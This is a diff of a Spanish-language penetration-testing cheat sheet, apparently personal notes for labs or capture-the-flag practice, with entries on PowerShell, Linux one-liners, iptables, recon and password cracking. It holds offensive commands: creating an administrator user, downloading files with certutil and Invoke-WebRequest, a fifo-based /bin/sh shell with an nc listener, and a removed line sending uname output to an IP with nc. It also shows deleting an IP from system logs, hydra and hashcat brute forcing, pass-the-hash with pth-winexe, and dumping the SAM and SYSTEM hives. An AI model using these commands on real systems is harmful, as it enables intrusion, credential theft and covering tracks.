@@ -22,12 +22,13 @@
 - [Tmux](#tmux)
 - [Mysql](#mysql)
 
+---
 #### Powershell
 net user USUARIO PASSWORD /add --> *creación de usuario y contraseña*
 
-net localgroup administradores USUARIO /add --> *agrega el usuario "usuario" al grupo administradores*
+net localgroup administradores usuario /add --> *agrega "usuario" al grupo administradores*
 
-net share NOMBRE_COMPARTIDA C:\ /GRANT:sistemas,FULL --> *comparte una carpeta ubicada en (C:\) y le concede todos los permisos de acceso al usuario SISTEMAS*
+net share NOMBRE_COMPARTIDA C:\ /GRANT:SISTEMAS,FULL --> *comparte una carpeta ubicada en (C:\) y le concede todos los permisos de acceso al usuario SISTEMAS*
 
 copy \\IP\SHARE\FILE FILE
 
@@ -42,7 +43,7 @@ Invoke-WebRequest "http://ip/file" -OutFile "c:\Users\file"
 certutil.exe -f -urlcache -split http://ip/file file
 
 ---
-#### Creación de compartidas
+#### Creación de compartidas vía CLI
 $pass=convertto-securestring 'pass' -AsPlainText -Force
 
 $creds=New-Object System.Management.Automation.PSCredential('user', $pass)
@@ -83,27 +84,15 @@ cat nmap.grep | grep -oP '\d{1,5}/tcp.*'
 
 cat /proc/net/tcp | awk '{print $2}'| sort -u | grep -v "local" | awk '{print $2}' FS=':'
 
-time find . -type f -iname "*.txt" | grep -v "local"
-
 find \-name *config*.php | xargs cat | grep -i -E "db-pass|db-user"
 
 find . -type d -exec touch {}/FILE \;
-
-find . | grep exe$
-
-find \-user user 2>/dev/null | grep -vE 'proc|config'
-
-find . -ls -type f
 
 find . -type d | while read DIRECTORY; do echo ${DIRECTORY} | grep php; done
 
 tr '\n' ',' < tplinkList.txt
 
-tr -d '\"' | tr ';' '\n'
-
 sed -i '/192\.168\.0\.1/d' /var/log/messages.log --> *elimina todas las lineas que contienen la ip*
-
-uname -a | nc 10.8.23.159 9000
 
 mkfifo input; tail -f input | /bin/sh 2>/dev/null > output
 
@@ -115,29 +104,15 @@ rlwrap nc -lnvp 'port'
 
 awk '{print "https://" $1}'
 
-awk '{print $1 ".yahoo.com"}'
-
 ping -c ip -R --> *muestra ruta del ping hasta el destino*
 
 kill -9 $(jobs -p) 
 
-hostname -I
-
-cut -d; -f3 < !$
-
-wget -r ftp://user@ip
-
-wget -r --no-parent URL --reject="STRING"
-
-watch -d ls /var
-
 touch {/folder1/,./}file.{exe,dll,txt}
-
-evil-winrm -i IP -u USUARIO -p PASSWORD
 
 xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103
 
-echo 'b64-string' | base64 -d | xxd -ps -r; echo
+echo STRING | base64 -d | xxd -ps -r; echo
 
 echo !:2-3 --> *rango de argumentos*
 
@@ -149,15 +124,7 @@ echo !^ --> *primer argumento*
 
 echo !* --> *todos los argumentos*
 
-curlftpfs USUARIO:PASSWORD@IP $(pwd)
-
-curlftpfs -o allow_other USUARIOr:PASSWORD@IP $(pwd)
-
 curl -# --upload-file -F file=@FILE URL
-
-curl -U "USUARIO" --referer URL-SRC URL-DST
-
-openssl PASSWORD
 
 grep -oP '\[.*?\]' quita los corchetes
 
@@ -187,11 +154,11 @@ shopt -s HISTAPPEND
 
 ---
 #### Iptables
-iptables -I DOCKER-USER -i "int" -p tcp --dport "port" -j DROP --> *estado filtered* 
+iptables -I DOCKER-USER -i INTERFACE -p tcp --dport "port" -j DROP --> *estado filtered* 
 
-iptables -A INPUT -i "int" -p tcp --dport "port" -j REJECT --> *estado closed*
+iptables -A INPUT -i INTERFACE -p tcp --dport "port" -j REJECT --> *estado closed*
 
-iptables -A INPUT -i "int" -p tcp --dport "port" -j REJECT --reject-with tcp-reset --> *estado closed y no aparece en logs*
+iptables -A INPUT -i INTERFACE -p tcp --dport "port" -j REJECT --reject-with tcp-reset --> *estado closed y no aparece en logs*
 
 iptables -A INPUT -p tcp --dport 80 -j ACCEPT
 
@@ -199,7 +166,7 @@ iptables -A INPUT -s 192.168.1.104 -j ACCEPT --> *acepta solo tráfico de la sig
 
 iptables -A INPUT -s 192.168.1.102 -j DROP --> *bloquea tráfico de la siguiente IP*
 
-iptables -A INPUT -p icmp -i eth0 -j DROP --> *bloqueo de ping en la interface*
+iptables -A INPUT -p ICMP -i eth0 -j DROP --> *bloqueo de ping en la interface*
 
 ---
 #### SSH
@@ -209,15 +176,11 @@ ssh -L LOCAL_PORT:REMOTE_IP:REMOTE_PORT user@REMOTE-IP
 
 ---
 #### Recon
-nmap -p1-10 IP --reason --> *muestra información de escaneo* 
+nmap -p- IP --reason --> *muestra información de escaneo* 
 
-nmap --script="ssl*" IP
+nmap -top-ports 5000 --open -T5 -sU IP 
 
-nmap --script="rdp-vuln-ms12-020"
-
-nmap -top-ports 5000 --open -T5 -sU IP -oN scanUDP
-
-nmap -p445 --scripts "vuln and safe" IP -oN vuln.nmap
+nmap -p445 --scripts "vuln and safe" IP
 
 nmap --script smb-enum-share -p PORTS IP
  
@@ -239,23 +202,17 @@ ncrack -vv -U "user.lst" -P "pass.lst" ip:port
 
 hydra -L "user.lst" -V -x '6:8aA1!@#$' ip ssh --> *hydra crea su diccionario para ataque con números, min+may, simbolos*
 
-hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.137.91:21 -vV
-
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.179.73 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -vV
-
-hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.179.73
-
-hashcat --user -m 1000 hash lst -r rules/InsidePro-PasswordsPro.rule -r rules/base64.rule
 
 hashcat --examples-hashes | grep 'mode'
 
-hashcat --force --stdout dictionario.lst -r /usr/share/hashcat/rules/best64.rule
+hashcat --force --stdout diccionario -r /usr/share/hashcat/rules/best64.rule
 
-hashcat -m MODE -a 0 HASH LST --force -o FILE *a=fuerza bruta, o=archivo destino
+hashcat -m MODE -a 0 HASH diccionario --force -o FILE *a=fuerza bruta, o=archivo destino
 
-zip2john 8702.zip
+zip2john ZIP > FILE.out
 
-fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt 8702.zip
+fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt FILE.zip
 
 wfuzz -c -L --hc=404 -w WORDLIST TARGET --> *L=recursivo* 
 
@@ -304,7 +261,7 @@ pth-winexe -U domain/user%pass //IP CMD
 pth-winexe -U domain/user%hash //IP CMD
 
 ---
-#### SAM
+#### SAM Crack
 reg save HKLM\SAM sam.backup
 
 reg save HKLM\SYSTEM system.backup
